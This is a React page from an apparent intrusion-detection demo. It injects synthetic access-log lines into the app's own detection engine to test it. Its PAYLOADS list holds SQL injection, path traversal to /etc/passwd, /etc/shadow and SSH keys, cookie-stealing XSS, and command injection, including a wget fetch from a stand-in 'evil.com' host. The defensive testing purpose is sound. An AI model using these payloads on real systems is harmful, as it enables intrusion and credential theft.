'use client'
import { useState } from 'react'
import AppShell from '@/components/AppShell'
import { api, Attack } from '@/lib/api'
import { SEV_BG, ATTACK_ICON } from '@/lib/utils'

const ATTACK_TABS = [
  { id: 'sql', label: '💉 SQL Injection', type: 'SQL_INJECTION' },
  { id: 'brute', label: '🔨 Brute Force', type: 'BRUTE_FORCE' },
  { id: 'path', label: '📁 Path Traversal', type: 'PATH_TRAVERSAL' },
  { id: 'xss', label: '🕷️ XSS', type: 'XSS' },
  { id: 'cmd', label: '⚡ Command Injection', type: 'COMMAND_INJECTION' },
  { id: 'bot', label: '🤖 Bot Scanner', type: 'BOT_SCAN' },
]

const PAYLOADS: Record<string, string[]> = {
  sql: ["' OR '1'='1--", "admin' UNION SELECT username,password FROM users--", "1'; DROP TABLE users--", "1 AND SLEEP(5)--"],
  brute: ['admin:password', 'admin:123456', 'root:root', 'user:pass'],
  path: ['../../../../etc/passwd', '../../../../.ssh/id_rsa', '%2e%2e%2f%2e%2e%2fetc%2fshadow', '../../../../etc/hosts'],
  xss: ['<script>alert(document.cookie)</script>', '<img src=x onerror=alert(1)>', 'javascript:alert(document.cookie)', '<svg onload=alert(1)>'],
  cmd: ['localhost;cat /etc/passwd', '127.0.0.1|id', 'x;/bin/bash -i', 'x;wget http://evil.com/shell.sh'],
  bot: ['sqlmap/1.7.8', 'Nikto/2.1.6', 'masscan/1.0', 'dirbuster/1.0', 'zgrab/0.x'],
}

function buildLine(type: string, ip: string, payload: string): string {
  const ts = new Date().toLocaleString('en-GB', { hour12: false }).replace(',', '').replace(/\//g, '/').replace(' ', ':')
  const fmtTs = new Date().toUTCString().replace('GMT', '+0000').replace(', ', ' ').replace(/ (\d{2}:\d{2}:\d{2})/, ':$1')
  switch (type) {
    case 'sql': return `${ip} - - [${fmtTs}] "GET /login?user=${payload} HTTP/1.1" 401 512 "-" "sqlmap/1.7.8"`
    case 'brute': return `${ip} - - [${fmtTs}] "POST /login HTTP/1.1" 401 256 "-" "python-requests/2.31"`
    case 'path': return `${ip} - - [${fmtTs}] "GET /files?file=${payload} HTTP/1.1" 200 1024 "-" "curl/7.68"`
    case 'xss': return `${ip} - - [${fmtTs}] "GET /search?q=${payload} HTTP/1.1" 200 2048 "-" "Mozilla/5.0"`
    case 'cmd': return `${ip} - - [${fmtTs}] "GET /cmd?host=${payload} HTTP/1.1" 200 512 "-" "curl/7.68"`
    case 'bot': return `${ip} - - [${fmtTs}] "GET / HTTP/1.1" 200 4096 "-" "${payload}"`
    default: return ''
  }
}

export default function LauncherPage() {
  const [tab, setTab] = useState('sql')
  const [ip, setIp] = useState('11.11.11.11')
  const [payload, setPayload] = useState(PAYLOADS.sql[0])
  const [bruteCount, setBruteCount] = useState(7)
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState<{ injected: number; detected: number; attacks: Attack[] } | null>(null)

  async function launchAll() {
    setLoading(true); setResult(null)
    const r = await api.injectAll()
    setResult(r); setLoading(false)
  }

  async function launchSingle() {
    setLoading(true); setResult(null)
    let lines: string[]
    if (tab === 'brute') {
      lines = Array.from({ length: bruteCount }, () => buildLine(tab, ip, payload))
    } else {
      lines = [buildLine(tab, ip, payload)]
    }
    const r = await api.injectCustom(lines)
    setResult(r); setLoading(false)
  }

  return (
    <AppShell>
      <div className="max-w-4xl mx-auto space-y-6">
        <h1 className="text-xl font-bold text-white">🚀 Attack Launcher</h1>
        <p className="text-muted text-sm">Fire attacks against the system and watch the defense engine respond in real time.</p>

        {/* Launch All */}
        <div className="card border-red-900/40">
          <div className="flex items-start justify-between gap-4">
            <div>
              <h2 className="font-semibold text-white mb-1">⚡ Launch All Attack Types</h2>
              <p className="text-xs text-muted">Fires 28 attack log lines covering all 6 attack types simultaneously.</p>
              <div className="flex flex-wrap gap-2 mt-2">
                {['SQL Injection ×4', 'Brute Force ×7', 'Path Traversal ×4', 'XSS ×4', 'Command Injection ×4', 'Bot Scanners ×5'].map(t => (
                  <span key={t} className="text-xs px-2 py-0.5 rounded bg-surface border border-border text-muted">{t}</span>
                ))}
              </div>
            </div>
            <button onClick={launchAll} disabled={loading} className="btn-primary whitespace-nowrap shrink-0">
              {loading ? '⏳ Launching...' : '🔥 Launch All'}
            </button>
          </div>
        </div>

        {/* Individual */}
        <div className="card space-y-4">
          <h2 className="font-semibold text-white">🎯 Individual Attack</h2>

          {/* Tab selector */}
          <div className="flex flex-wrap gap-1">
            {ATTACK_TABS.map(t => (
              <button
                key={t.id}
                onClick={() => { setTab(t.id); setPayload(PAYLOADS[t.id][0]) }}
                className={`text-xs px-3 py-1.5 rounded-md border transition-colors ${tab === t.id ? 'bg-red-900/40 border-red-700/50 text-red-300' : 'border-border text-muted hover:text-white'}`}
              >
                {t.label}
              </button>
            ))}
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-xs text-muted mb-1 block">Attacker IP</label>
              <input className="input" value={ip} onChange={e => setIp(e.target.value)} />
            </div>
            <div>
              <label className="text-xs text-muted mb-1 block">Payload</label>
              <select className="input" value={payload} onChange={e => setPayload(e.target.value)}>
                {PAYLOADS[tab].map(p => <option key={p} value={p}>{p}</option>)}
              </select>
            </div>
          </div>

          {tab === 'brute' && (
            <div>
              <label className="text-xs text-muted mb-1 block">Number of attempts</label>
              <input type="number" min={3} max={20} className="input w-32" value={bruteCount} onChange={e => setBruteCount(Number(e.target.value))} />
            </div>
          )}

          <button onClick={launchSingle} disabled={loading} className="btn-secondary">
            {loading ? '⏳ Firing...' : `${ATTACK_TABS.find(t => t.id === tab)?.label} →`}
          </button>
        </div>

        {/* Results */}
        {result && (
          <div className="card space-y-3">
            <div className="flex items-center gap-6 text-sm flex-wrap">
              <span className="text-muted">Total injected: <span className="text-white font-bold">{result.injected}</span></span>
              <span className="text-muted">Normal traffic: <span className="text-green-400 font-bold">{(result as any).normal_requests ?? 0}</span></span>
              <span className="text-muted">Attacks detected: <span className="text-red-400 font-bold">{result.detected}</span></span>
            </div>
            <div className="space-y-1">
              {result.attacks.map((a, i) => (
                <div key={i} className="flex items-center gap-3 text-xs py-1.5 border-b border-border/50">
                  <span>{ATTACK_ICON[a.attack_type] || '⚠️'}</span>
                  <span className={`px-1.5 py-0.5 rounded border text-xs ${SEV_BG[a.severity]}`}>{a.severity}</span>
                  <span className="font-semibold">{a.attack_type?.replace(/_/g, ' ')}</span>
                  <span className="font-mono text-muted">{a.ip}</span>
                  {a.blocked && <span className="text-red-400">🔒 BLOCKED</span>}
                </div>
              ))}
            </div>
            <p className="text-xs text-muted">
              Check <a href="/attacks" className="text-blue-400 hover:underline">Live Attacks</a> or <a href="/" className="text-blue-400 hover:underline">Overview</a> to see results.
            </p>
          </div>
        )}
      </div>
    </AppShell>
  )
}
